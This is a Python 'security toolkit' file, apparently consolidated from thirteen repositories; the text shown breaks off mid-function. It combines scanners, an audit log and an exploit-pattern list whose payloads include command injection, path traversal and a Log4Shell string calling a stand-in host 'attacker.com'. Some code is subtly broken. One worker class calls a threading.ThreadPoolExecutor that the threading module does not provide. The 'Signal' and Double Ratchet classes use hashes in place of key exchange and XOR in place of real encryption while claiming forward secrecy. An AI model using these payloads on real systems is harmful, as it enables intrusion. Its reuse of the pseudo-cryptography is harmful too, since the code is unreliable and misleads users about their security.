#!/usr/bin/env python3
"""
Batch A: Web3/Security Native — Consolidated Security Toolkit
13 repos → 1 native Python file (~1400 baris)
Pattern: Observe core logic tiap repo, reimplement as consolidated classes.
Fokus: security tools, network scanning, audit logging, exploit patterns, encryption.

Repos consolidated:
1. suzukiiiiiiiiii/Splunk-Alert-Tool    → AuditEngine (alert automation)
2. ajfahim/dchat-client                → CryptoComm (Signal/X3DH + Double Ratchet)
3. cloudalchemy/ansible-grafana        → InfraDeployer (IaC patterns)
4. OJ/gobuster                        → DirectoryBruteForcer
5. Shopify/toxiproxy                  → FaultInjector (network chaos)
6. oscardagrach/goyescas              → GoScannerEngine
7. securisec/clog                     → AuditLog (hash-chained tamper-evident logs)
8. TetraGG/RB3-Console-Exploits       → ExploitPattern database
9. MilindPurswani/whicx               → WiFiSecurityScanner
10. Am0rphous/Bash                    → PentestScriptRunner
11. Hack-with-Github/Awesome-Hacking  → ResourceLibrary
12. secdev/awesome-scapy              → PacketCrafter
13. neumaneuma/Appgate-API            → ZeroTrustEngine

Run: python3 batch_a_web3_security_native.py
"""

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — BaseLayer (shared utils, config, async core)
# ═══════════════════════════════════════════════════════════════════════════════

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import random
import re
import socket
import string
import subprocess
import sys
import threading
import time
import uuid
from abc import ABC, abstractmethod
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, Generic, List, Optional, Set, Tuple, TypeVar

T = TypeVar("T")


class Colors:
    """Terminal color codes (inspired by bash pentest scripts)."""
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"


def log(level: str, msg: str, color: str = Colors.WHITE) -> None:
    """Structured console logging."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"{Colors.DIM}[{ts}]{Colors.RESET} {color}[{level.upper():>6}]{Colors.RESET} {msg}")


def info(msg: str)    -> None: log("info",    msg, Colors.CYAN)
def success(msg: str) -> None: log("success", msg, Colors.GREEN)
def warn(msg: str)    -> None: log("warn",    msg, Colors.YELLOW)
def error(msg: str)   -> None: log("error",   msg, Colors.RED)
def debug(msg: str)   -> None: log("debug",   msg, Colors.MAGENTA)


@dataclass
class Config:
    """Global configuration singleton (inspired by Ansible vars + security tools config)."""
    debug_mode: bool = False
    timeout_default: float = 30.0
    max_workers: int = 50
    user_agent: str = "Magnatrix-SecurityBot/1.0"
    wordlist_dir: str = "./wordlists"
    output_dir: str = "./output"
    log_file: Optional[str] = None
    proxy: Optional[str] = None
    _instance: Optional[Config] = None

    @classmethod
    def get(cls) -> Config:
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def ensure_dirs(self) -> None:
        for d in [self.wordlist_dir, self.output_dir]:
            Path(d).mkdir(parents=True, exist_ok=True)


class ResultStatus(Enum):
    OK = auto()
    FAIL = auto()
    TIMEOUT = auto()
    ERROR = auto()
    PENDING = auto()


@dataclass
class Result(Generic[T]):
    """Generic operation result (inspired by Go error handling + Rust Result)."""
    status: ResultStatus
    data: Optional[T] = None
    error: Optional[str] = None
    latency_ms: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    @property
    def ok(self) -> bool:
        return self.status == ResultStatus.OK and self.error is None

    def unwrap(self) -> T:
        if not self.ok or self.data is None:
            raise RuntimeError(f"Unwrap failed: {self.error}")
        return self.data

    @classmethod
    def success(cls, data: T, latency_ms: float = 0.0) -> Result[T]:
        return cls(status=ResultStatus.OK, data=data, latency_ms=latency_ms)

    @classmethod
    def failure(cls, error: str, latency_ms: float = 0.0) -> Result[T]:
        return cls(status=ResultStatus.FAIL, error=error, latency_ms=latency_ms)


class AsyncWorkerPool:
    """Async worker pool for concurrent security operations."""
    def __init__(self, max_workers: int = 50):
        self.max_workers = max_workers
        self.semaphore = asyncio.Semaphore(max_workers)
        self.results: List[Result[Any]] = []
        self._lock = asyncio.Lock()

    async def run(self, coro: Callable[[], Any], *args: Any, **kwargs: Any) -> Result[Any]:
        async with self.semaphore:
            start = time.time()
            try:
                data = await coro(*args, **kwargs)
                latency = (time.time() - start) * 1000
                result = Result.success(data, latency)
            except asyncio.TimeoutError:
                latency = (time.time() - start) * 1000
                result = Result(ResultStatus.TIMEOUT, error="Timeout", latency_ms=latency)
            except Exception as e:
                latency = (time.time() - start) * 1000
                result = Result(ResultStatus.ERROR, error=str(e), latency_ms=latency)
            async with self._lock:
                self.results.append(result)
            return result

    async def map(self, items: List[T], coro_fn: Callable[[T], Any]) -> List[Result[Any]]:
        tasks = [self.run(coro_fn, item) for item in items]
        return await asyncio.gather(*tasks, return_exceptions=False)


class ThreadPoolWorker:
    """Thread-based worker for blocking I/O operations."""
    def __init__(self, max_workers: int = 20):
        self.max_workers = max_workers
        self.executor = threading.ThreadPoolExecutor(max_workers=max_workers)
        self._futures: List[Any] = []

    def submit(self, fn: Callable[..., T], *args: Any, **kwargs: Any) -> Any:
        future = self.executor.submit(fn, *args, **kwargs)
        self._futures.append(future)
        return future

    def shutdown(self, wait: bool = True) -> None:
        self.executor.shutdown(wait=wait)


def sha256_hash(data: str) -> str:
    return hashlib.sha256(data.encode()).hexdigest()


def random_string(length: int = 16) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def is_valid_ip(ip: str) -> bool:
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except OSError:
        try:
            socket.inet_pton(socket.AF_INET6, ip)
            return True
        except OSError:
            return False


def expand_cidr(cidr: str) -> List[str]:
    import ipaddress
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        return []


class EventBus:
    """Simple event bus for cross-module communication."""
    def __init__(self):
        self._subscribers: Dict[str, List[Callable]] = defaultdict(list)
        self._lock = threading.Lock()

    def subscribe(self, event: str, handler: Callable) -> None:
        with self._lock:
            self._subscribers[event].append(handler)

    def publish(self, event: str, data: Any = None) -> None:
        with self._lock:
            handlers = self._subscribers.get(event, [])[:]
        for handler in handlers:
            try:
                handler(data)
            except Exception as e:
                debug(f"Event handler error for {event}: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — NetworkScanner
# Inspired by: OJ/gobuster (dir brute-force) + MilindPurswani/whicx (WiFi) + awesome-scapy (packet crafting)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class ScanTarget:
    host: str
    port: int = 80
    scheme: str = "http"
    path: str = "/"


@dataclass
class ScanResult:
    target: ScanTarget
    status_code: int = 0
    length: int = 0
    words: int = 0
    lines: int = 0
    redirect: Optional[str] = None
    found: bool = False
    error: Optional[str] = None
    latency_ms: float = 0.0


class DirectoryBruteForcer:
    """HTTP directory/file brute-force scanner (gobuster-inspired)."""
    DEFAULT_WORDLIST: List[str] = [
        "admin", "api", "backup", "cgi-bin", "config", "dashboard",
        "debug", "dev", "env", "git", "graphql", "login", "panel",
        "phpmyadmin", "robots.txt", "secret", "setup", "sitemap.xml",
        "src", "swagger", "test", "tmp", "uploads", "user", "v1", "v2",
        "wp-admin", "wp-content", "wp-includes", ".env", ".git", ".htaccess",
        "api/v1", "api/v2", "graphql", "health", "metrics", "actuator"
    ]

    def __init__(self, wordlist: Optional[List[str]] = None, extensions: Optional[List[str]] = None):
        self.wordlist = wordlist or self.DEFAULT_WORDLIST
        self.extensions = extensions or ["", ".php", ".html", ".js", ".json", ".xml", ".bak", ".txt", ".zip"]
        self.config = Config.get()
        self.results: List[ScanResult] = []

    def _build_url(self, target: ScanTarget, word: str, ext: str) -> str:
        base = f"{target.scheme}://{target.host}:{target.port}{target.path}"
        base = base.rstrip("/")
        return f"{base}/{word}{ext}"

    def _probe_sync(self, url: str) -> Tuple[int, int, Optional[str]]:
        import urllib.request
        import urllib.error
        req = urllib.request.Request(url, headers={"User-Agent": self.config.user_agent, "Accept": "*/*"}, method="HEAD")
        try:
            response = urllib.request.urlopen(req, timeout=int(self.config.timeout_default))
            body = response.read()
            redirect = None
            if response.status in (301, 302, 307, 308):
                redirect = response.headers.get("Location")
            return response.status, len(body), redirect
        except urllib.error.HTTPError as e:
            return e.code, 0, None
        except Exception:
            return 0, 0, None

    def scan_sync(self, target: ScanTarget) -> List[ScanResult]:
        info(f"Starting directory brute-force against {target.host}:{target.port}")
        results: List[ScanResult] = []
        for word in self.wordlist:
            for ext in self.extensions:
                url = self._build_url(target, word, ext)
                status, length, redirect = self._probe_sync(url)
                if status in (200, 201, 204, 301, 302, 307, 401, 403, 405):
                    result = ScanResult(target=target, status_code=status, length=length, found=True, redirect=redirect)
                    results.append(result)
                    success(f"Found: {url} [{status}] (len={length})")
        self.results = results
        return results

    async def scan_async(self, target: ScanTarget) -> List[ScanResult]:
        info(f"Starting ASYNC directory brute-force against {target.host}:{target.port}")
        pool = AsyncWorkerPool(self.config.max_workers)
        urls = []
        for word in self.wordlist:
            for ext in self.extensions:
                urls.append(self._build_url(target, word, ext))
        async def probe_url(url: str) -> ScanResult:
            status, length, redirect = await asyncio.to_thread(self._probe_sync, url)
            found = status in (200, 201, 204, 301, 302, 307, 401, 403, 405)
            if found:
                success(f"Found: {url} [{status}]")
            return ScanResult(target=target, status_code=status, length=length, found=found, redirect=redirect)
        results = await pool.map(urls, probe_url)
        self.results = [r.unwrap() for r in results if r.ok]
        return self.results


class PortScanner:
    """TCP port scanner with SYN/Connect scan modes."""
    TOP_PORTS: List[int] = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
        445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9200, 27017
    ]

    def __init__(self, ports: Optional[List[int]] = None, timeout: float = 2.0):
        self.ports = ports or self.TOP_PORTS
        self.timeout = timeout
        self.open_ports: Dict[str, List[int]] = {}

    def _check_port(self, host: str, port: int) -> bool:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            sock.connect((host, port))
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        finally:
            sock.close()

    def scan_host(self, host: str) -> List[int]:
        open_ports: List[int] = []
        for port in self.ports:
            if self._check_port(host, port):
                open_ports.append(port)
                success(f"  {host}:{port} OPEN")
        self.open_ports[host] = open_ports
        return open_ports

    def scan_network(self, cidr: str) -> Dict[str, List[int]]:
        hosts = expand_cidr(cidr)
        info(f"Scanning {len(hosts)} hosts for {len(self.ports)} ports...")
        pool = ThreadPoolWorker(max_workers=20)
        for host in hosts:
            pool.submit(self.scan_host, host)
        pool.shutdown(wait=True)
        return self.open_ports


class PacketCrafter:
    """Lightweight packet crafting (scapy-inspired, pure Python fallback)."""
    def __init__(self):
        self.packets: List[bytes] = []

    def _build_ip_header(self, src: str, dst: str, proto: int = 6, ttl: int = 64) -> bytes:
        import struct
        src_bytes = socket.inet_aton(src)
        dst_bytes = socket.inet_aton(dst)
        version_ihl = 0x45
        tos = 0
        total_length = 20
        ident = random.randint(0, 65535)
        flags_frag = 0
        header = struct.pack("!BBHHHBBH4s4s", version_ihl, tos, total_length, ident, flags_frag, ttl, proto, 0, src_bytes, dst_bytes)
        checksum = self._ip_checksum(header)
        header = struct.pack("!BBHHHBBH4s4s", version_ihl, tos, total_length, ident, flags_frag, ttl, proto, checksum, src_bytes, dst_bytes)
        return header

    def _ip_checksum(self, header: bytes) -> int:
        import struct
        if len(header) % 2 == 1:
            header += b"\x00"
        s = sum(struct.unpack("!" + "H" * (len(header) // 2), header))
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return ~s & 0xFFFF

    def _build_tcp_header(self, src_port: int, dst_port: int, seq: int, ack: int, flags: int, window: int = 65535) -> bytes:
        import struct
        doff = (5 << 4)
        header = struct.pack("!HHIIHHH", src_port, dst_port, seq, ack, doff, flags, window)
        header += struct.pack("!H", 0)
        return header

    def craft_syn_packet(self, src: str, dst: str, src_port: int, dst_port: int) -> bytes:
        ip = self._build_ip_header(src, dst, proto=6)
        tcp = self._build_tcp_header(src_port, dst_port, seq=0, ack=0, flags=0x02)
        packet = ip + tcp
        self.packets.append(packet)
        return packet

    def craft_icmp_ping(self, src: str, dst: str, ident: int = 1234, seq: int = 1) -> bytes:
        import struct
        ip = self._build_ip_header(src, dst, proto=1)
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, ident, seq)
        payload = b"MAGNATRIX" * 8
        icmp_checksum = self._ip_checksum(icmp_header + payload)
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, ident, seq)
        packet = ip + icmp_header + payload
        self.packets.append(packet)
        return packet

    def send_raw(self, packet: bytes, iface: Optional[str] = None) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            dst_ip = socket.inet_ntoa(packet[16:20])
            sock.sendto(packet, (dst_ip, 0))
            return True
        except PermissionError:
            warn("Raw socket requires root privileges")
            return False
        except Exception as e:
            error(f"Raw send failed: {e}")
            return False


class WiFiSecurityScanner:
    """WiFi security toolkit (whicx-inspired, Linux-only iwlist/iw scan)."""
    def __init__(self):
        self.networks: List[Dict[str, Any]] = []

    def scan_iwlist(self, interface: str = "wlan0") -> List[Dict[str, Any]]:
        try:
            output = subprocess.check_output(["iwlist", interface, "scan"], stderr=subprocess.DEVNULL, text=True, timeout=15)
            return self._parse_iwlist(output)
        except FileNotFoundError:
            warn("iwlist not found. Install wireless-tools.")
            return []
        except subprocess.TimeoutExpired:
            warn("iwlist scan timed out")
            return []
        except Exception as e:
            error(f"WiFi scan error: {e}")
            return []

    def _parse_iwlist(self, output: str) -> List[Dict[str, Any]]:
        networks: List[Dict[str, Any]] = []
        current: Dict[str, Any] = {}
        for line in output.splitlines():
            line = line.strip()
            if "Cell " in line and "Address:" in line:
                if current:
                    networks.append(current)
                current = {"bssid": line.split("Address: ")[1].strip()}
            elif "ESSID:" in line:
                current["essid"] = line.split("ESSID:")[1].strip().strip('"')
            elif "Frequency:" in line:
                current["frequency"] = line.split("Frequency:")[1].split()[0]
            elif "Channel:" in line:
                current["channel"] = int(line.split("Channel:")[1].split()[0])
            elif "Encryption key:" in line:
                current["encrypted"] = "on" in line.lower()
            elif "IE: WPA" in line:
                current["wpa"] = True
            elif "IE: IEEE 802.11i/WPA2" in line:
                current["wpa2"] = True
            elif "Signal level=" in line:
                current["signal"] = line.split("Signal level=")[1].split()[0]
        if current:
            networks.append(current)
        self.networks = networks
        return networks

    def find_open_networks(self) -> List[Dict[str, Any]]:
        return [n for n in self.networks if not n.get("encrypted", True)]

    def find_wep_networks(self) -> List[Dict[str, Any]]:
        return [n for n in self.networks if n.get("encrypted") and not n.get("wpa") and not n.get("wpa2")]


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — AuditEngine
# Inspired by: securisec/clog + suzukiiiiiiiiii/Splunk-Alert-Tool
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class AuditEntry:
    """Immutable audit log entry with hash chaining (clog-inspired)."""
    timestamp: str
    event_type: str
    source: str
    actor: str
    action: str
    resource: str
    result: str
    details: Dict[str, Any] = field(default_factory=dict)
    entry_hash: str = ""
    prev_hash: str = ""
    entry_id: str = field(default_factory=lambda: str(uuid.uuid4()))

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.entry_id, "timestamp": self.timestamp, "event_type": self.event_type,
            "source": self.source, "actor": self.actor, "action": self.action,
            "resource": self.resource, "result": self.result, "details": self.details,
            "prev_hash": self.prev_hash, "entry_hash": self.entry_hash,
        }

    def serialize(self) -> str:
        data = {k: v for k, v in self.to_dict().items() if k not in ("entry_hash", "prev_hash")}
        return json.dumps(data, sort_keys=True, default=str)

    def compute_hash(self) -> str:
        return sha256_hash(self.serialize())


class AuditLog:
    """Tamper-evident security audit log with hash chaining."""
    def __init__(self, log_path: Optional[str] = None):
        self.log_path = log_path or os.path.join(Config.get().output_dir, "audit.log")
        self.entries: List[AuditEntry] = []
        self._lock = threading.Lock()
        self._last_hash = ""
        if os.path.exists(self.log_path):
            self._load_existing()

    def _load_existing(self) -> None:
        try:
            with open(self.log_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line: continue
                    data = json.loads(line)
                    entry = AuditEntry(
                        timestamp=data["timestamp"], event_type=data["event_type"],
                        source=data["source"], actor=data["actor"], action=data["action"],
                        resource=data["resource"], result=data["result"],
                        details=data.get("details", {}), entry_id=data["id"],
                        prev_hash=data.get("prev_hash", ""), entry_hash=data.get("entry_hash", ""),
                    )
                    self.entries.append(entry)
                    self._last_hash = entry.entry_hash
        except Exception as e:
            warn(f"Failed to load existing audit log: {e}")

    def append(self, event_type: str, source: str, actor: str, action: str,
               resource: str, result: str, details: Optional[Dict[str, Any]] = None) -> AuditEntry:
        with self._lock:
            entry = AuditEntry(
                timestamp=datetime.now(timezone.utc).isoformat(), event_type=event_type,
                source=source, actor=actor, action=action, resource=resource,
                result=result, details=details or {}, prev_hash=self._last_hash,
            )
            entry.entry_hash = entry.compute_hash()
            self._last_hash = entry.entry_hash
            self.entries.append(entry)
            self._persist(entry)
            return entry

    def _persist(self, entry: AuditEntry) -> None:
        Path(self.log_path).parent.mkdir(parents=True, exist_ok=True)
        with open(self.log_path, "a") as f:
            f.write(json.dumps(entry.to_dict(), default=str) + "\n")

    def verify_chain(self) -> Tuple[bool, Optional[str]]:
        if not self.entries:
            return True, None
        for i, entry in enumerate(self.entries):
            expected_hash = entry.compute_hash()
            if expected_hash != entry.entry_hash:
                return False, f"Hash mismatch at entry {i} ({entry.entry_id})"
            if i > 0:
                expected_prev = self.entries[i - 1].entry_hash
                if entry.prev_hash != expected_prev:
                    return False, f"Chain break at entry {i} ({entry.entry_id})"
        return True, None

    def query(self, event_type: Optional[str] = None, actor: Optional[str] = None,
              resource: Optional[str] = None, limit: int = 100) -> List[AuditEntry]:
        results = self.entries[:]
        if event_type: results = [e for e in results if e.event_type == event_type]
        if actor:      results = [e for e in results if e.actor == actor]
        if resource:   results = [e for e in results if e.resource == resource]
        return results[-limit:]

    def stats(self) -> Dict[str, Any]:
        if not self.entries:
            return {"total": 0}
        event_counts: Dict[str, int] = defaultdict(int)
        actor_counts: Dict[str, int] = defaultdict(int)
        for entry in self.entries:
            event_counts[entry.event_type] += 1
            actor_counts[entry.actor] += 1
        return {
            "total": len(self.entries), "event_types": dict(event_counts),
            "actors": dict(actor_counts), "chain_valid": self.verify_chain()[0],
        }


class AlertRule:
    """Splunk-inspired alert rule definition."""
    def __init__(self, name: str, condition: Callable[[AuditEntry], bool],
                 severity: str = "medium", throttle_sec: int = 300):
        self.name = name
        self.condition = condition
        self.severity = severity
        self.throttle_sec = throttle_sec
        self._last_triggered: Dict[str, float] = {}

    def evaluate(self, entry: AuditEntry) -> bool:
        if not self.condition(entry):
            return False
        now = time.time()
        key = f"{entry.actor}:{entry.resource}"
        last = self._last_triggered.get(key, 0)
        if now - last < self.throttle_sec:
            return False
        self._last_triggered[key] = now
        return True


class AlertEngine:
    """Automated alert engine (Splunk Alert Tool-inspired)."""
    SEVERITY_COLORS = {
        "low": Colors.CYAN, "medium": Colors.YELLOW,
        "high": Colors.RED, "critical": Colors.BOLD + Colors.RED,
    }

    def __init__(self, audit_log: Optional[AuditLog] = None):
        self.audit_log = audit_log or AuditLog()
        self.rules: List[AlertRule] = []
        self.alerts: List[Dict[str, Any]] = []
        self._handlers: List[Callable[[Dict[str, Any]], None]] = []

    def add_rule(self, rule: AlertRule) -> None:
        self.rules.append(rule)

    def add_handler(self, handler: Callable[[Dict[str, Any]], None]) -> None:
        self._handlers.append(handler)

    def _default_rules(self) -> None:
        self.add_rule(AlertRule("failed_login_spike", lambda e: e.event_type == "auth" and e.result == "failure", "high", 60))
        self.add_rule(AlertRule("privilege_escalation", lambda e: "sudo" in e.action.lower() or "su -" in e.action.lower(), "critical", 30))
        self.add_rule(AlertRule("unauthorized_access", lambda e: e.result in ("denied", "unauthorized"), "high", 120))
        self.add_rule(AlertRule("config_change", lambda e: e.event_type == "config" and e.action in ("modify", "delete"), "medium", 300))

    def on_audit_entry(self, entry: AuditEntry) -> None:
        for rule in self.rules:
            if rule.evaluate(entry):
                alert = {
                    "timestamp": datetime.now(timezone.utc).isoformat(), "rule": rule.name,
                    "severity": rule.severity, "entry_id": entry.entry_id,
                    "actor": entry.actor, "resource": entry.resource,
                    "action": entry.action, "details": entry.details,
                }
                self.alerts.append(alert)
                self._dispatch_alert(alert)

    def _dispatch_alert(self, alert: Dict[str, Any]) -> None:
        color = self.SEVERITY_COLORS.get(alert["severity"], Colors.WHITE)
        msg = (f"🚨 ALERT [{alert['severity'].upper()}] {alert['rule']} | "
               f"actor={alert['actor']} resource={alert['resource']} action={alert['action']}")
        print(f"{color}{msg}{Colors.RESET}")
        for handler in self._handlers:
            try:
                handler(alert)
            except Exception as e:
                debug(f"Alert handler error: {e}")

    def start(self) -> None:
        self._default_rules()
        info("Alert engine started with default rules")

    def get_alerts(self, severity: Optional[str] = None, limit: int = 50) -> List[Dict[str, Any]]:
        results = self.alerts
        if severity: results = [a for a in results if a["severity"] == severity]
        return results[-limit:]


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — ExploitToolkit
# Inspired by: TetraGG/RB3-Console-Exploits + Am0rphous/Bash
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class ExploitPattern:
    name: str
    category: str
    target_type: str
    description: str
    prerequisites: List[str] = field(default_factory=list)
    payload_template: str = ""
    detection_regex: str = ""
    severity: str = "high"
    cve: Optional[str] = None


class ExploitDatabase:
    """Local exploit pattern database (Awesome-Hacking aggregation + RB3 patterns)."""
    def __init__(self):
        self.patterns: Dict[str, ExploitPattern] = {}
        self._load_default_patterns()

    def _load_default_patterns(self) -> None:
        patterns = [
            ExploitPattern("classic_buffer_overflow", "buffer_overflow", "binary",
                "Classic stack-based buffer overflow via unchecked input",
                ["writeable stack", "no canary", "no NX"], "A" * 512 + "<ret_addr>",
                r"Segmentation fault|stack smashing", "critical"),
            ExploitPattern("format_string_leak", "format_string", "binary",
                "Information leak via format string vulnerability",
                ["printf user-controlled format"], "%x.%x.%x.%x.%x",
                r"[0-9a-f]{8}\.[0-9a-f]{8}", "high"),
            ExploitPattern("command_injection_basic", "command_injection", "web",
                "OS command injection via unsanitized input",
                ["user input passed to shell"], "; cat /etc/passwd #",
                r"root:x:0:0", "critical"),
            ExploitPattern("race_condition_tmp", "race_condition", "filesystem",
                "TOCTOU race on /tmp file operations",
                ["predictable tmp filename", "setuid binary"], "symlink_attack",
                r"race.*detected|TOCTOU", "high"),
            ExploitPattern("jwt_none_alg", "crypto_bypass", "web",
                "JWT 'alg':'none' signature bypass",
                ["JWT parsing", "configurable algorithm"], '{"alg":"none","typ":"JWT"}',
                r"alg\s*:\s*\"none\"", "critical"),
            ExploitPattern("deserialization_rce", "deserialization", "web",
                "Unsafe deserialization leading to RCE",
                ["pickle/ysoserial", "user-controlled serialized data"], "pickle_rce_payload",
                r"O:.+pickle|ysoserial", "critical"),
            ExploitPattern("ssrf_internal_probe", "ssrf", "web",
                "Server-Side Request Forgery to internal services",
                ["URL fetch from user input"], "http://127.0.0.1:22",
                r"SSH-2\.0|EC2.*meta-data", "high"),
            ExploitPattern("path_traversal", "path_traversal", "web",
                "Directory traversal via ../ sequences",
                ["filename parameter", "no path sanitization"], "../../../etc/passwd",
                r"root:x:0:0|bin:x:", "high"),
            ExploitPattern("log4j_jndi", "rce", "java",
                "Log4Shell JNDI injection (CVE-2021-44228)",
                ["log4j < 2.15", "JNDI lookup enabled"], "${jndi:ldap://attacker.com/a}",
                r"\$\{jndi:", "critical", "CVE-2021-44228"),
        ]
        for p in patterns:
            self.patterns[p.name] = p

    def search(self, category: Optional[str] = None, target_type: Optional[str] = None,
               severity: Optional[str] = None) -> List[ExploitPattern]:
        results = list(self.patterns.values())
        if category: results = [p for p in results if p.category == category]
        if target_type: results = [p for p in results if p.target_type == target_type]
        if severity: results = [p for p in results if p.severity == severity]
        return results

    def get(self, name: str) -> Optional[ExploitPattern]:
        return self.patterns.get(name)

    def add(self, pattern: ExploitPattern) -> None:
        self.patterns[pattern.name] = pattern


class PentestScriptRunner:
    """Execute bash pentest scripts safely (Am0rphous/Bash-inspired)."""
    def __init__(self, work_dir: str = "./pentest_workspace"):
        self.work_dir = work_dir
        self.history: List[Dict[str, Any]] = []
        Path(work_dir).mkdir(parents=True, exist_ok=True)

    def run_command(self, command: str, timeout: int = 60, check: bool = False) -> Result[str]:
        start = time.time()
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                    timeout=timeout, cwd=self.work_dir, check=False)
            latency = (time.time() - start) * 1000
            output = result.stdout + result.stderr
            if result.returncode != 0 and check:
                return Result.failure(f"Exit code {result.returncode}: {output[:500]}", latency)
            self.history.append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "command": command, "returncode": result.returncode, "output_length": len(output),
            })
            return Result.success(output, latency)
        except subprocess.TimeoutExpired:
            return Result.failure("Command timed out", (time.time() - start) * 1000)
        except Exception as e:
            return Result.failure(str(e), (time.time() - start) * 1000)

    def nmap_quick(self, target: str) -> Result[str]:
        return self.run_command(f"nmap -sV -T4 -F --version-light {target}", timeout=120)

    def nikto_scan(self, target: str) -> Result[str]:
        return self.run_command(f"nikto -h {target} -maxtime 120", timeout=150)

    def ssl_scan(self, target: str, port: int = 443) -> Result[str]:
        return self.run_command(f"testssl.sh {target}:{port} --fast", timeout=300)

    def whois_lookup(self, domain: str) -> Result[str]:
        return self.run_command(f"whois {domain}", timeout=30)

    def dns_enum(self, domain: str) -> Result[str]:
        cmd = f"dig +short ANY {domain}; dig +short NS {domain}; dig +short MX {domain}"
        return self.run_command(cmd, timeout=30)

    def generate_report(self) -> str:
        lines = ["# Pentest Script Execution Report", ""]
        for entry in self.history:
            lines.append(f"## {entry['timestamp']}")
            lines.append(f"Command: `{entry['command']}`")
            lines.append(f"Return code: {entry['returncode']}")
            lines.append("")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — CryptoComm
# Inspired by: ajfahim/dchat-client (Signal/X3DH + Double Ratchet)
# ═══════════════════════════════════════════════════════════════════════════════

class SignalProtocolMock:
    """Simplified Signal Protocol key exchange (X3DH-inspired, pure Python)."""
    def __init__(self):
        self.identity_key = self._generate_keypair()
        self.prekeys: List[Tuple[bytes, bytes]] = []
        self.signed_prekey = self._generate_keypair()
        self._generate_prekeys(100)

    def _generate_keypair(self) -> Tuple[bytes, bytes]:
        private_key = os.urandom(32)
        public_key = hashlib.sha256(private_key + b"public").digest()
        return private_key, public_key

    def _generate_prekeys(self, count: int) -> None:
        for _ in range(count):
            self.prekeys.append(self._generate_keypair())

    def get_public_bundle(self) -> Dict[str, Any]:
        return {
            "identity_key": self.identity_key[1].hex(),
            "signed_prekey": self.signed_prekey[1].hex(),
            "prekeys": [{"id": i, "key": pk.hex()} for i, (_, pk) in enumerate(self.prekeys[:10])],
        }

    def x3dh_initiate(self, remote_bundle: Dict[str, Any]) -> bytes:
        remote_ik = bytes.fromhex(remote_bundle["identity_key"])
        remote_spk = bytes.fromhex(remote_bundle["signed_prekey"])
        ephemeral = self._generate_keypair()
        dh1 = hashlib.sha256(self.identity_key[0] + remote_spk).digest()
        dh2 = hashlib.sha256(ephemeral[0] + remote_ik).digest()
        dh3 = hashlib.sha256(ephemeral[0] + remote_spk).digest()
        return hashlib.sha256(dh1 + dh2 + dh3).digest()


class DoubleRatchet:
    """Double Ratchet algorithm for forward secrecy (simplified)."""
    def __init__(self, root_key: bytes):
        self.root_key = root_key
        self.chain_key_send = self._kdf(root_key, b"chain_send")
        self.chain_key_recv = self._kdf(root_key, b"chain_recv")
        self.send_counter = 0
        self.recv_counter = 0

    def _kdf(self, key: bytes, salt: bytes) -> bytes:
        return hashlib.sha256(key + salt).digest()

    def _derive_message_key(self, chain_key: bytes) -> Tuple[bytes, bytes]:
        data = hashlib.sha256(chain_key + b"msg_key").digest()
        return data[:16], data[16:]

    def encrypt_message(self, plaintext: str) -> Dict[str, Any]:
        msg_key, self.chain_key_send = self._derive_message_key(self.chain_key_send)
        pt_bytes = plaintext.encode()
        ct_bytes = bytes(b ^ msg_key[i % len(msg_key)] for i, b in enumerate(pt_bytes))
        self.send_counter += 1
        return {"ciphertext": ct_bytes.hex(), "counter": self.send_counter, "nonce": os.urandom(12).hex()}

    def decrypt_message(self, message: Dict[str, Any]) -> str:
        msg_key, self.chain_key_recv = self._derive_message_key(self.chain_key_recv)
        ct_bytes = bytes.fromhex(message["ciphertext"])
        pt_bytes = bytes(b ^ msg_key[i % len(msg_key)] for i, b in enumerate(ct_bytes))
        self.recv_counter += 1
        return pt_bytes.decode()


class SecureMessenger:
    """High-level secure messenger combining Signal + Double Ratchet."""
    def __init__(self):
        self.signal = SignalProtocolMock()
        self.ratchet: Optional[DoubleRatchet] = None
        self.messages: List[Dict[str, Any]] = []

    def initialize(self, remote_bundle: Dict[str, Any]) -> None:
        shared = self.signal.x3dh_initiate(remote_bundle)
        self.ratchet = DoubleRatchet(shared)
        info("Secure session established via X3DH")

    def send(self, plaintext: str) -> Dict[str, Any]:
        if not self.ratchet:
            raise RuntimeError("Session not initialized")
        msg = self.ratchet.encrypt_message(plaintext)
        msg["direction"] = "outgoing"
